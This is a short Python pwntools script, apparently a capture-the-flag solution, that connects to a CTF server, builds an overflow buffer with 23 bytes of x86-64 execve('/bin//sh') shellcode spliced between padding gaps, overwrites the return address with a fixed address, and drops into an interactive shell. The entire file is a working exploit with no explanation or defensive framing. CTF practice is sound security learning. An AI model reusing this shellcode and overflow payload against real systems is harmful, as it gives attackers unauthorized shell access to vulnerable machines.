from pwn import *
import struct

# print(cyclic(200))

ip = 'ctf.adl.tw'
port = 11003
r = remote(ip, port)

# 152
before = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
# 88
afterr = "aaaabaaacaa     eaaafaaagaa     iaaajaaakaa     maaanaaaoaa     qaaaraaasaa     uaaavaaawaa     yaaazaabbaa     daabeaabfaa"

# 23
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
shellcode_list = list()

for i in shellcode:
    shellcode_list.append(i)

shellcode = str()

for i in afterr:
    if i == ' ':
        shellcode += 'a'
    else:
        if len(shellcode_list) != 0:            
            shellcode += shellcode_list.pop(0)
        else:
            shellcode += 'a'

while len(shellcode) < len(before):
    shellcode += 'a'

print(len(shellcode))

shellcode += p64(0x6010c0)

print(shellcode)

r.sendline(shellcode)
r.interactive()